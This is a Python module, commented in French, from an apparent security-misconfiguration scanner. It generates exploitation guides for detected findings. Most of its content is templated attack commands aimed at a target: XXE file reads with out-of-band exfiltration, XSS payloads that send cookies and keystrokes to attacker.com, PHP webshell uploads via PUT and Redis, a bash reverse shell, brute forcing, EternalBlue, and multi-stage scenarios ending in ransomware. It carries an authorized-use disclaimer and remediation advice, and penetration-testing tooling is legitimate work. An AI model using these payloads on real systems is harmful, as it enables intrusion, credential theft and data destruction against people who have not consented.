"""G√©n√©rateur de Proof of Concept (POC) d'exploitation pour les vuln√©rabilit√©s d√©tect√©es."""

import time
import os
from typing import Any, Dict, List


def generate_exploitation_guide(results: List[Dict[str, Any]]) -> Dict[str, Any]:
    """G√©n√®re un guide complet d'exploitation pour chaque vuln√©rabilit√© trouv√©e."""

    exploitation_guide = {
        "total_vulnerabilities": 0,
        "exploitable_findings": [],
        "exploitation_scenarios": [],
        "tools_required": set(),
        "risk_summary": {
            "CRITICAL": 0,
            "HIGH": 0,
            "MEDIUM": 0,
            "LOW": 0
        }
    }

    for result in results:
        findings = result.get("findings", [])
        scan_type = result.get("scan_type", "")
        target = result.get("target", "")

        for finding in findings:
            severity = finding.get("severity", "INFO")
            title = finding.get("title", "")
            evidence = finding.get("evidence", "")

            if severity in ["CRITICAL", "HIGH", "MEDIUM"]:
                exploitation_guide["total_vulnerabilities"] += 1
                exploitation_guide["risk_summary"][severity] += 1

                # G√©n√©rer POC selon le type de vuln√©rabilit√©
                poc = generate_poc_for_finding(scan_type, finding, target, evidence)

                if poc:
                    exploitation_guide["exploitable_findings"].append({
                        "vulnerability": title,
                        "severity": severity,
                        "scan_type": scan_type,
                        "target": target,
                        "poc": poc
                    })

                    exploitation_guide["tools_required"].update(poc.get("tools", []))

    # Convertir set en list pour JSON
    exploitation_guide["tools_required"] = sorted(list(exploitation_guide["tools_required"]))

    # G√©n√©rer sc√©narios d'exploitation combin√©s
    exploitation_guide["exploitation_scenarios"] = generate_attack_scenarios(exploitation_guide["exploitable_findings"])

    return exploitation_guide


def generate_poc_for_finding(scan_type: str, finding: Dict[str, Any], target: str, evidence: str) -> Dict[str, Any]:
    """G√©n√®re un POC sp√©cifique selon le type de vuln√©rabilit√©."""

    title = finding.get("title", "").lower()
    poc = {
        "description": "",
        "commands": [],
        "tools": [],
        "exploitation_steps": [],
        "impact": "",
        "remediation": finding.get("recommendation", "")
    }

    # ==============================
    # FICHIERS SENSIBLES EXPOS√âS
    # ==============================
    if "sensitive files" in title or ".env" in evidence or ".git" in evidence:
        poc["description"] = "T√©l√©chargement de fichiers sensibles expos√©s"
        poc["impact"] = "Vol de credentials, secrets, code source complet"
        poc["tools"] = ["curl", "wget", "git-dumper"]

        if ".env" in evidence:
            poc["commands"] = [
                f"# T√©l√©charger .env avec credentials",
                f"curl {target}/.env -o .env",
                f"cat .env | grep -E '(PASSWORD|SECRET|KEY|TOKEN)'",
                f"",
                f"# Exploitation automatique des credentials",
                f"python3 exploit_env.py .env"
            ]
            poc["exploitation_steps"] = [
                "1. T√©l√©charger le fichier .env expos√©",
                "2. Extraire tous les secrets (DB_PASSWORD, API_KEYS, etc.)",
                "3. Utiliser les credentials pour acc√©der aux services (DB, AWS, etc.)",
                "4. Escalade de privil√®ges ou vol de donn√©es"
            ]

        elif ".git" in evidence:
            poc["commands"] = [
                f"# Dumper le repository Git complet",
                f"git-dumper {target}/.git/ output/",
                f"cd output && git checkout -- .",
                f"",
                f"# Rechercher secrets dans l'historique",
                f"git log -p | grep -E '(password|secret|key|token)' -i",
                f"",
                f"# Trouver credentials dans commits",
                f"truffleHog --regex --entropy=False {target}/.git/"
            ]
            poc["exploitation_steps"] = [
                "1. Utiliser git-dumper pour reconstruire le repository complet",
                "2. Analyser l'historique des commits pour trouver secrets supprim√©s",
                "3. R√©cup√©rer le code source complet de l'application",
                "4. Analyser le code pour trouver d'autres vuln√©rabilit√©s",
                "5. Utiliser les secrets trouv√©s pour acc√®s non autoris√©"
            ]
            poc["tools"].append("truffleHog")

        elif "backup" in evidence or ".zip" in evidence or ".sql" in evidence:
            poc["commands"] = [
                f"# T√©l√©charger backup/dump",
                f"wget {target}/{evidence.split('/')[-1]}",
                f"",
                f"# Extraire si archive",
                f"unzip backup.zip || tar -xzf backup.tar.gz",
                f"",
                f"# Analyser dump SQL",
                f"grep -i 'INSERT INTO users' dump.sql",
                f"grep -i 'password' dump.sql"
            ]
            poc["exploitation_steps"] = [
                "1. T√©l√©charger le fichier de backup expos√©",
                "2. Extraire le contenu (code source, base de donn√©es, etc.)",
                "3. R√©cup√©rer les hashes de mots de passe depuis les dumps SQL",
                "4. Craquer les mots de passe avec hashcat/john",
                "5. Utiliser les comptes pour acc√®s administrateur"
            ]

    # ==============================
    # XXE (XML EXTERNAL ENTITY)
    # ==============================
    elif "xxe" in title.lower():
        poc["description"] = "Exploitation XML External Entity (XXE)"
        poc["impact"] = "Lecture de fichiers syst√®me, SSRF, RCE (si expect://), DoS"
        poc["tools"] = ["curl", "burp", "xxeinjector"]
        poc["commands"] = [
            f"# XXE Basique - Lecture /etc/passwd",
            f"curl -X POST {target}/xml \\",
            f"  -H 'Content-Type: application/xml' \\",
            f"  -d '<?xml version=\"1.0\"?>",
            f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            f"<foo>&xxe;</foo>'",
            f"",
            f"# XXE avec wrapper PHP (lecture base64)",
            f"curl -X POST {target}/xml \\",
            f"  -d '<?xml version=\"1.0\"?>",
            f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>",
            f"<foo>&xxe;</foo>'",
            f"",
            f"# XXE Out-of-Band avec DTD externe",
            f"# 1. H√©berger DTD malveillant sur votre serveur (evil.dtd):",
            f"# <!ENTITY % file SYSTEM \"file:///etc/passwd\">",
            f"# <!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_IP/?data=%file;'>\">",
            f"# %eval;",
            f"# %exfiltrate;",
            f"",
            f"curl -X POST {target}/xml \\",
            f"  -d '<?xml version=\"1.0\"?>",
            f"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://YOUR_IP/evil.dtd\">%xxe;]>",
            f"<foo>test</foo>'"
        ]
        poc["exploitation_steps"] = [
            "1. Identifier un endpoint acceptant XML",
            "2. Tester XXE basique pour lecture de /etc/passwd",
            "3. Si bloqu√©, tenter PHP wrapper base64",
            "4. Si pas de retour direct, utiliser XXE Out-of-Band",
            "5. Exfiltrer fichiers sensibles (/etc/shadow, config files)",
            "6. Tenter RCE avec expect:// si disponible",
            "7. Utiliser pour SSRF vers services internes"
        ]

    # ==============================
    # TRACE METHOD (XST)
    # ==============================
    elif "trace" in title.lower():
        poc["description"] = "Cross-Site Tracing (XST) via TRACE method"
        poc["impact"] = "Vol de cookies HttpOnly, bypass de protections XSS"
        poc["tools"] = ["curl", "burp"]
        poc["commands"] = [
            f"# V√©rifier TRACE activ√©",
            f"curl -X TRACE {target} -v",
            f"",
            f"# Exploitation XST via JavaScript",
            f"# Injecter dans XSS:",
            f"<script>",
            f"var xhr = new XMLHttpRequest();",
            f"xhr.open('TRACE', '{target}', true);",
            f"xhr.onload = function() {{",
            f"  // Cookies HttpOnly dans la r√©ponse TRACE",
            f"  fetch('http://attacker.com/steal?cookies=' + ",
            f"        btoa(xhr.responseText));",
            f"}};",
            f"xhr.send();",
            f"</script>"
        ]
        poc["exploitation_steps"] = [
            "1. V√©rifier que TRACE est activ√© avec curl",
            "2. Trouver une XSS sur le site (reflected ou stored)",
            "3. Injecter le payload XST via XSS",
            "4. R√©cup√©rer cookies HttpOnly refl√©t√©s dans TRACE",
            "5. Voler la session de l'utilisateur"
        ]

    # ==============================
    # DIRECTORY LISTING
    # ==============================
    elif "directory listing" in title.lower():
        poc["description"] = "Exploitation du directory listing pour √©num√©ration"
        poc["impact"] = "D√©couverte de fichiers sensibles, t√©l√©chargement code source"
        poc["tools"] = ["wget", "curl"]
        poc["commands"] = [
            f"# T√©l√©chargement r√©cursif du r√©pertoire",
            f"wget -r -np -nH --cut-dirs=1 {target}/backup/",
            f"",
            f"# √ânum√©ration des fichiers int√©ressants",
            f"curl {target}/backup/ | grep -oP 'href=\"\\K[^\"]+' | grep -E '\\.(php|sql|zip|tar|gz|env|config)'",
            f"",
            f"# T√©l√©chargement s√©lectif",
            f"for file in $(curl -s {target}/backup/ | grep -oP 'href=\"\\K[^\"]+'); do",
            f"  wget {target}/backup/$file",
            f"done"
        ]
        poc["exploitation_steps"] = [
            "1. Identifier les r√©pertoires avec listing activ√©",
            "2. √ânum√©rer tous les fichiers disponibles",
            "3. T√©l√©charger les fichiers sensibles (backups, configs, etc.)",
            "4. Analyser le code source pour trouver d'autres vuln√©rabilit√©s",
            "5. Extraire credentials des fichiers de configuration"
        ]

    # ==============================
    # ERREURS VERBOSES / STACK TRACES
    # ==============================
    elif "verbose error" in title.lower() or "stack trace" in title.lower():
        poc["description"] = "Exploitation des erreurs verboses pour reconnaissance"
        poc["impact"] = "Information disclosure (chemins, versions, structure DB)"
        poc["tools"] = ["curl", "burp", "wfuzz"]
        poc["commands"] = [
            f"# Provoquer erreurs SQL",
            f"curl \"{target}?id='\" # Erreur SQL",
            f"curl \"{target}?id=1' OR '1'='1\" # Extraire structure",
            f"",
            f"# Provoquer erreurs d'inclusion",
            f"curl \"{target}?page=../../../../../etc/passwd\"",
            f"",
            f"# Fuzzing pour erreurs",
            f"wfuzz -w payloads.txt {target}/FUZZ",
            f"",
            f"# Analyser les stack traces pour:",
            f"# - Chemins absolus du serveur",
            f"# - Versions exactes (PHP, framework)",
            f"# - Structure de la base de donn√©es",
            f"# - Noms de fonctions/classes vuln√©rables"
        ]
        poc["exploitation_steps"] = [
            "1. Provoquer des erreurs avec payloads malform√©s",
            "2. Collecter tous les stack traces",
            "3. Extraire informations sensibles (chemins, versions)",
            "4. Identifier les fonctions vuln√©rables dans le code",
            "5. Rechercher CVEs pour les versions d√©tect√©es",
            "6. Cibler l'exploitation sur les points faibles identifi√©s"
        ]

    # ==============================
    # HEADERS MANQUANTS
    # ==============================
    elif "missing security header" in title.lower():
        header_name = title.split(":")[-1].strip() if ":" in title else ""

        if "content-security-policy" in title.lower():
            poc["description"] = "Exploitation du manque de CSP pour XSS"
            poc["impact"] = "XSS sans restriction, vol de donn√©es, defacement"
            poc["tools"] = ["burp", "xsser"]
            poc["commands"] = [
                f"# Sans CSP, toutes les XSS fonctionnent",
                f"# Payload XSS simple:",
                f"<script>alert(document.cookie)</script>",
                f"",
                f"# XSS avanc√© - Exfiltration",
                f"<script>",
                f"fetch('http://attacker.com/steal', {{",
                f"  method: 'POST',",
                f"  body: JSON.stringify({{",
                f"    cookies: document.cookie,",
                f"    localStorage: localStorage,",
                f"    sessionStorage: sessionStorage",
                f"  }})",
                f"}});",
                f"</script>",
                f"",
                f"# Keylogger XSS",
                f"<script>document.onkeypress=function(e){{fetch('http://attacker.com/keys?k='+e.key)}}</script>"
            ]

        elif "x-frame-options" in title.lower():
            poc["description"] = "Clickjacking via absence de X-Frame-Options"
            poc["impact"] = "Actions non autoris√©es via overlay invisible"
            poc["tools"] = ["burp"]
            poc["commands"] = [
                f"# Page HTML malveillante (clickjacking.html):",
                f"<html>",
                f"<head><title>Clickjacking Demo</title></head>",
                f"<body>",
                f"  <h1>Cliquez ici pour gagner 1000‚Ç¨!</h1>",
                f"  <iframe src=\"{target}/admin/delete-user?id=1\" ",
                f"          style=\"opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;\">",
                f"  </iframe>",
                f"</body>",
                f"</html>",
                f"",
                f"# Victime clique = action admin ex√©cut√©e"
            ]

    # ==============================
    # PORTS/SERVICES EXPOS√âS
    # ==============================
    elif "open tcp ports" in title.lower() or "services exposed" in title.lower():
        poc["description"] = "Exploitation des services expos√©s"
        poc["impact"] = "Acc√®s non autoris√©, escalade de privil√®ges"
        poc["tools"] = ["nmap", "metasploit", "hydra", "mysql", "psql"]

        services_found = []
        if "3306" in evidence or "mysql" in evidence.lower():
            services_found.append("MySQL")
        if "5432" in evidence or "postgresql" in evidence.lower():
            services_found.append("PostgreSQL")
        if "6379" in evidence or "redis" in evidence.lower():
            services_found.append("Redis")
        if "27017" in evidence or "mongodb" in evidence.lower():
            services_found.append("MongoDB")
        if "22" in evidence or "ssh" in evidence.lower():
            services_found.append("SSH")
        if "21" in evidence or "ftp" in evidence.lower():
            services_found.append("FTP")
        if "23" in evidence or "telnet" in evidence.lower():
            services_found.append("Telnet")

        commands = []
        steps = []

        for service in services_found:
            if service == "MySQL":
                commands.extend([
                    f"# Exploitation MySQL",
                    f"# 1. Bruteforce",
                    f"hydra -l root -P /usr/share/wordlists/rockyou.txt {target.replace('http://', '').replace('https://', '')} mysql",
                    f"",
                    f"# 2. Connexion (si password trouv√©)",
                    f"mysql -h {target.replace('http://', '').replace('https://', '')} -u root -p",
                    f"",
                    f"# 3. Dump de toutes les bases",
                    f"mysqldump -h {target.replace('http://', '').replace('https://', '')} -u root -p --all-databases > dump.sql"
                ])
                steps.extend([
                    f"MySQL: Bruteforce root -> Dump bases de donn√©es -> Vol de donn√©es"
                ])

            elif service == "Redis":
                commands.extend([
                    f"# Exploitation Redis (souvent sans auth)",
                    f"redis-cli -h {target.replace('http://', '').replace('https://', '')}",
                    f"",
                    f"# Commandes:",
                    f"INFO  # Infos serveur",
                    f"KEYS *  # Lister toutes les cl√©s",
                    f"GET <key>  # R√©cup√©rer valeur",
                    f"",
                    f"# √âcrire webshell via Redis",
                    f"config set dir /var/www/html",
                    f"config set dbfilename shell.php",
                    f"set test '<?php system($_GET[\"cmd\"]); ?>'",
                    f"save"
                ])
                steps.extend([
                    f"Redis: Connexion sans auth -> Dump donn√©es -> RCE via webshell"
                ])

            elif service == "MongoDB":
                commands.extend([
                    f"# Exploitation MongoDB",
                    f"mongo {target.replace('http://', '').replace('https://', '')}:27017",
                    f"",
                    f"# Commandes:",
                    f"show dbs",
                    f"use <database>",
                    f"show collections",
                    f"db.<collection>.find()"
                ])
                steps.extend([
                    f"MongoDB: Connexion sans auth -> √ânum√©ration bases -> Dump collections"
                ])

        if commands:
            poc["commands"] = commands
            poc["exploitation_steps"] = steps

    # ==============================
    # SMB/TELNET/FTP LEGACY
    # ==============================
    elif "legacy" in title.lower() or "smb" in title.lower() or "telnet" in title.lower():
        poc["description"] = "Exploitation de services legacy non s√©curis√©s"
        poc["impact"] = "Acc√®s non autoris√©, interception credentials, ransomware"
        poc["tools"] = ["smbclient", "enum4linux", "metasploit", "telnet", "hydra"]

        if "smb" in evidence.lower() or "445" in evidence:
            poc["commands"] = [
                f"# √ânum√©ration SMB",
                f"enum4linux -a {target.replace('http://', '').replace('https://', '')}",
                f"",
                f"# Lister les partages",
                f"smbclient -L //{target.replace('http://', '').replace('https://', '')} -N",
                f"",
                f"# Connexion anonyme",
                f"smbclient //{target.replace('http://', '').replace('https://', '')}/share -N",
                f"",
                f"# Exploitation EternalBlue (MS17-010)",
                f"use exploit/windows/smb/ms17_010_eternalblue",
                f"set RHOST {target.replace('http://', '').replace('https://', '')}",
                f"exploit"
            ]
            poc["exploitation_steps"] = [
                "1. √ânum√©rer les partages SMB accessibles",
                "2. Tenter connexion anonyme ou bruteforce",
                "3. T√©l√©charger fichiers sensibles des partages",
                "4. V√©rifier vuln√©rabilit√© EternalBlue (MS17-010)",
                "5. Exploitation pour RCE et d√©ploiement ransomware"
            ]

        elif "telnet" in evidence.lower() or "23" in evidence:
            poc["commands"] = [
                f"# Connexion Telnet (non chiffr√©)",
                f"telnet {target.replace('http://', '').replace('https://', '')} 23",
                f"",
                f"# Sniffing credentials (depuis r√©seau local)",
                f"tcpdump -i eth0 -A -s 0 'tcp port 23' | grep -E 'login|password'",
                f"",
                f"# Bruteforce",
                f"hydra -l admin -P passwords.txt {target.replace('http://', '').replace('https://', '')} telnet"
            ]
            poc["exploitation_steps"] = [
                "1. Connexion Telnet (tout en clair)",
                "2. Sniffing r√©seau pour capturer credentials",
                "3. Bruteforce si sniffing impossible",
                "4. Acc√®s shell complet une fois connect√©"
            ]

    # ==============================
    # HTTP METHODS DANGEREUX
    # ==============================
    elif "put method" in title.lower() or "delete method" in title.lower():
        poc["description"] = "Upload malveillant via PUT method"
        poc["impact"] = "RCE via webshell, defacement, destruction de donn√©es"
        poc["tools"] = ["curl"]
        poc["commands"] = [
            f"# Upload webshell PHP via PUT",
            f"curl -X PUT {target}/shell.php -d '<?php system($_GET[\"cmd\"]); ?>'",
            f"",
            f"# V√©rifier upload",
            f"curl {target}/shell.php?cmd=id",
            f"",
            f"# Exploitation RCE",
            f"curl \"{target}/shell.php?cmd=cat /etc/passwd\"",
            f"curl \"{target}/shell.php?cmd=whoami\"",
            f"curl \"{target}/shell.php?cmd=ls -la\"",
            f"",
            f"# Reverse shell",
            f"curl \"{target}/shell.php?cmd=bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"",
            f"",
            f"# Si DELETE activ√©:",
            f"curl -X DELETE {target}/index.php  # Defacement"
        ]
        poc["exploitation_steps"] = [
            "1. Uploader webshell via PUT method",
            "2. V√©rifier que le fichier est accessible",
            "3. Ex√©cuter commandes syst√®me via webshell",
            "4. √âtablir reverse shell pour acc√®s persistant",
            "5. Escalade de privil√®ges locale",
            "6. Pivot vers autres syst√®mes du r√©seau"
        ]

    # ==============================
    # COOKIE FLAGS MANQUANTS
    # ==============================
    elif "cookie without" in title.lower():
        if "secure" in title.lower():
            poc["description"] = "Vol de session via cookie sans flag Secure"
            poc["impact"] = "Session hijacking sur connexion HTTP"
            poc["commands"] = [
                f"# MitM pour capturer cookie",
                f"# 1. Forcer downgrade HTTPS -> HTTP",
                f"# 2. Capturer cookie avec Wireshark/tcpdump",
                f"tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i cookie"
            ]

        elif "httponly" in title.lower():
            poc["description"] = "Vol de cookie via XSS (pas de HttpOnly)"
            poc["impact"] = "Session hijacking via JavaScript"
            poc["commands"] = [
                f"# Payload XSS pour voler cookie",
                f"<script>",
                f"fetch('http://attacker.com/steal?c=' + document.cookie);",
                f"</script>",
                f"",
                f"# Ou via image",
                f"<img src=x onerror='this.src=\"http://attacker.com/?c=\"+document.cookie'>"
            ]

    return poc if poc["commands"] or poc["exploitation_steps"] else None


def generate_attack_scenarios(exploitable_findings: List[Dict[str, Any]]) -> List[Dict[str, str]]:
    """G√©n√®re des sc√©narios d'attaque combinant plusieurs vuln√©rabilit√©s."""

    scenarios = []

    # Analyser les vuln√©rabilit√©s disponibles
    has_file_exposure = any("sensitive files" in f["vulnerability"].lower() for f in exploitable_findings)
    has_xxe = any("xxe" in f["vulnerability"].lower() for f in exploitable_findings)
    has_directory_listing = any("directory listing" in f["vulnerability"].lower() for f in exploitable_findings)
    has_services = any("port" in f["vulnerability"].lower() or "service" in f["vulnerability"].lower() for f in exploitable_findings)
    has_verbose_errors = any("verbose error" in f["vulnerability"].lower() for f in exploitable_findings)

    # Sc√©nario 1: Reconnaissance -> Exploitation fichiers
    if has_file_exposure or has_directory_listing:
        scenarios.append({
            "name": "üí∞ Sc√©nario 1: Vol de Credentials et Code Source",
            "steps": """
1. RECONNAISSANCE
   - √ânum√©rer fichiers expos√©s (.env, .git, backups)
   - T√©l√©charger tous les fichiers sensibles

2. EXTRACTION DE SECRETS
   - Parser .env pour DB_PASSWORD, API_KEYS, AWS_CREDENTIALS
   - Dumper repository Git complet
   - Analyser code source pour credentials hardcod√©s

3. EXPLOITATION
   - Utiliser credentials DB pour dump complet
   - Acc√©der aux services cloud (AWS, GCP) avec les cl√©s
   - Utiliser API keys pour acc√®s privil√©gi√©s

4. POST-EXPLOITATION
   - Cr√©er backdoors dans le code
   - Exfiltrer toutes les donn√©es
   - Maintenir acc√®s persistant
            """,
            "impact": "CRITIQUE - Acc√®s complet aux donn√©es et services",
            "probability": "HAUTE"
        })

    # Sc√©nario 2: XXE -> RCE
    if has_xxe:
        scenarios.append({
            "name": "üî• Sc√©nario 2: XXE vers RCE",
            "steps": """
1. D√âCOUVERTE XXE
   - Identifier endpoint XML vuln√©rable
   - Confirmer lecture de fichiers syst√®me

2. RECONNAISSANCE VIA XXE
   - Lire /etc/passwd pour √©num√©rer utilisateurs
   - Lire configuration Apache/Nginx (/etc/apache2/sites-enabled/)
   - Identifier chemins webroot

3. EXPLOITATION AVANC√âE
   - Lire cl√©s SSH priv√©es (~/.ssh/id_rsa)
   - Tenter expect:// pour RCE direct
   - SSRF vers services internes (AWS metadata, Redis, etc.)

4. √âTABLIR RCE
   - Combiner XXE + PUT method pour upload webshell
   - Ou utiliser XXE + SSRF pour exploiter services internes
   - Reverse shell vers attaquant

5. POST-EXPLOITATION
   - Escalade de privil√®ges
   - Pivot r√©seau interne
   - D√©ploiement de ransomware
            """,
            "impact": "CRITIQUE - Remote Code Execution",
            "probability": "MOYENNE"
        })

    # Sc√©nario 3: Services expos√©s -> Pivot
    if has_services:
        scenarios.append({
            "name": "üåê Sc√©nario 3: Compromission Services Backend",
            "steps": """
1. √âNUM√âRATION SERVICES
   - Scanner tous les ports (1-65535)
   - Identifier bases de donn√©es expos√©es
   - V√©rifier authentification

2. EXPLOITATION BASES DE DONN√âES
   - Bruteforce MySQL/PostgreSQL/MongoDB
   - Connexion Redis sans authentification
   - Dump complet de toutes les donn√©es

3. PERSISTENCE
   - Cr√©er compte admin dans DB
   - Modifier prix/permissions
   - Injecter webshell via DB (MySQL -> INTO OUTFILE)

4. PIVOT R√âSEAU
   - Utiliser DB compromise pour scanner r√©seau interne
   - Identifier autres serveurs
   - Propagation lat√©rale
            """,
            "impact": "CRITIQUE - Acc√®s donn√©es sensibles + pivot",
            "probability": "HAUTE"
        })

    # Sc√©nario 4: Cha√Æne d'exploitation compl√®te
    if has_verbose_errors and has_file_exposure:
        scenarios.append({
            "name": "‚ö° Sc√©nario 4: Exploitation Cha√Æn√©e (Multi-Stage)",
            "steps": """
1. PHASE RECONNAISSANCE
   - Provoquer erreurs verboses pour obtenir:
     * Chemins absolus
     * Versions exactes (PHP, framework)
     * Structure base de donn√©es
   - T√©l√©charger .env et .git

2. PHASE ANALYSE
   - Rechercher CVEs pour versions identifi√©es
   - Extraire credentials de .env
   - Reconstruire code source depuis .git

3. PHASE EXPLOITATION INITIALE
   - Utiliser credentials DB pour acc√®s
   - Exploiter CVE identifi√©e
   - Upload webshell via vuln√©rabilit√© trouv√©e

4. PHASE ESCALADE
   - RCE via webshell
   - Lecture /etc/shadow
   - Crack passwords avec hashcat
   - Escalade vers root

5. PHASE POST-EXPLOITATION
   - Installation rootkit
   - Cr√©ation utilisateur backdoor
   - Exfiltration donn√©es
   - Ransomware ou cryptominer
            """,
            "impact": "CATASTROPHIQUE - Compromission compl√®te",
            "probability": "MOYENNE-HAUTE"
        })

    return scenarios


def generate_markdown_report(exploitation_guide: Dict[str, Any], output_file: str = "EXPLOITATION_GUIDE.md"):
    """G√©n√®re un rapport Markdown complet avec tous les POCs."""

    total_vulns = exploitation_guide.get('total_vulnerabilities', 0)

    content = """# üî• GUIDE D'EXPLOITATION - VULNERABILIT√âS D√âTECT√âES

## ‚ö†Ô∏è AVERTISSEMENT L√âGAL

**CE DOCUMENT EST STRICTEMENT CONFIDENTIEL ET √Ä USAGE AUTORIS√â UNIQUEMENT**

- ‚úÖ Utilisation pour audit de s√©curit√© autoris√© UNIQUEMENT
- ‚úÖ Tests sur syst√®mes dont vous avez la permission
- ‚ùå INTERDIT: Exploitation malveillante ou non autoris√©e
- ‚ùå INTERDIT: Partage avec des tiers non autoris√©s

**L'utilisation malveillante de ces informations est ILL√âGALE et punissable par la loi.**

---

## üìä R√âSUM√â EX√âCUTIF

"""

    # Cas sp√©cial : aucune vuln√©rabilit√©
    if total_vulns == 0:
        content += """
### ‚úÖ Aucune Vuln√©rabilit√© Exploitable D√©tect√©e

**Bonne nouvelle !** Le scan n'a d√©tect√© aucune vuln√©rabilit√© majeure exploitable.

Cependant, cela ne signifie pas que le syst√®me est 100% s√©curis√©. Ce scanner se concentre sur les **mauvaises configurations (A02)** uniquement.

### Recommandations

1. **Continuer les tests** - Scanner les autres cat√©gories OWASP (A01, A03, A04, etc.)
2. **Tests manuels** - Certaines vuln√©rabilit√©s n√©cessitent une analyse manuelle
3. **Pentesting complet** - Engager un pentest professionnel pour une √©valuation compl√®te
4. **Maintenir la vigilance** - Faire des scans r√©guliers (mensuels recommand√©s)

### Prochaines √âtapes

- Scanner les autres cat√©gories OWASP Top 10
- Effectuer des tests d'injection (A03)
- V√©rifier les contr√¥les d'authentification (A07)
- Tester les vuln√©rabilit√©s de logique m√©tier
- Audit du code source

---

**Date de g√©n√©ration** : """ + time.strftime("%Y-%m-%d %H:%M:%S") + """

---

*Rapport g√©n√©r√© automatiquement par A02 Security Misconfiguration Scanner*
"""
        # √âcrire le fichier
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(content)

        return output_file

    content += f"""
### Statistiques

- **Total de vuln√©rabilit√©s exploitables**: {exploitation_guide['total_vulnerabilities']}
- **CRITICAL**: {exploitation_guide['risk_summary']['CRITICAL']}
- **HIGH**: {exploitation_guide['risk_summary']['HIGH']}
- **MEDIUM**: {exploitation_guide['risk_summary']['MEDIUM']}
- **LOW**: {exploitation_guide['risk_summary']['LOW']}

### Outils Requis

"""

    for tool in exploitation_guide['tools_required']:
        content += f"- `{tool}`\n"

    content += "\n---\n\n"

    # POCs d√©taill√©s
    content += "## üéØ PROOF OF CONCEPTS (POCs)\n\n"

    for idx, finding in enumerate(exploitation_guide['exploitable_findings'], 1):
        content += f"### {idx}. {finding['vulnerability']}\n\n"
        content += f"**S√©v√©rit√©**: `{finding['severity']}`  \n"
        content += f"**Type de scan**: `{finding['scan_type']}`  \n"
        content += f"**Cible**: `{finding['target']}`  \n\n"

        poc = finding['poc']

        if poc['description']:
            content += f"#### Description\n{poc['description']}\n\n"

        if poc['impact']:
            content += f"#### Impact\n{poc['impact']}\n\n"

        if poc['tools']:
            content += f"#### Outils\n"
            for tool in poc['tools']:
                content += f"- `{tool}`\n"
            content += "\n"

        if poc['commands']:
            content += f"#### Commandes d'Exploitation\n\n```bash\n"
            content += "\n".join(poc['commands'])
            content += "\n```\n\n"

        if poc['exploitation_steps']:
            content += f"#### √âtapes d'Exploitation\n\n"
            for step in poc['exploitation_steps']:
                content += f"{step}\n"
            content += "\n"

        if poc['remediation']:
            content += f"#### Rem√©diation\n{poc['remediation']}\n\n"

        content += "---\n\n"

    # Sc√©narios d'attaque
    if exploitation_guide['exploitation_scenarios']:
        content += "## üé≠ SC√âNARIOS D'ATTAQUE AVANC√âS\n\n"

        for scenario in exploitation_guide['exploitation_scenarios']:
            content += f"### {scenario['name']}\n\n"
            content += f"**Impact**: {scenario['impact']}  \n"
            content += f"**Probabilit√©**: {scenario['probability']}  \n\n"
            content += f"#### D√©roulement\n{scenario['steps']}\n\n"
            content += "---\n\n"

    # Recommandations
    content += """
## üõ°Ô∏è RECOMMANDATIONS G√âN√âRALES

### Priorit√© CRITIQUE

1. **Supprimer imm√©diatement** tous les fichiers sensibles expos√©s (.env, .git, backups)
2. **Changer tous les mots de passe et secrets** potentiellement compromis
3. **D√©sactiver les services** non n√©cessaires expos√©s publiquement
4. **Patcher imm√©diatement** les vuln√©rabilit√©s critiques (XXE, RCE, etc.)

### Priorit√© HAUTE

1. Impl√©menter headers de s√©curit√© (CSP, HSTS, X-Frame-Options)
2. Configurer flags cookies (Secure, HttpOnly, SameSite)
3. D√©sactiver m√©thodes HTTP dangereuses (TRACE, PUT, DELETE)
4. Bloquer directory listing
5. Impl√©menter pages d'erreur personnalis√©es

### Priorit√© MOYENNE

1. Durcir configuration des services (MySQL, Redis, MongoDB)
2. Impl√©menter firewall r√©seau (bloquer ports inutiles)
3. Activer authentification sur tous les services
4. Chiffrer communications (TLS partout)

### Surveillance Continue

1. Monitorer acc√®s aux fichiers sensibles
2. D√©tecter tentatives d'exploitation (IDS/IPS)
3. Audits de s√©curit√© r√©guliers
4. Pentest annuel

---

## üìû SUPPORT

Pour toute question sur ce rapport ou l'exploitation des vuln√©rabilit√©s :
- Consulter la documentation OWASP
- Contacter l'√©quipe de s√©curit√©

**Date de g√©n√©ration**: """ + time.strftime("%Y-%m-%d %H:%M:%S") + """

---

*Rapport g√©n√©r√© automatiquement par A02 Security Misconfiguration Scanner*
"""

    # √âcrire le fichier
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(content)

    return output_file


if __name__ == "__main__":
    import time
    # Module de g√©n√©ration de POC d'exploitation
    pass
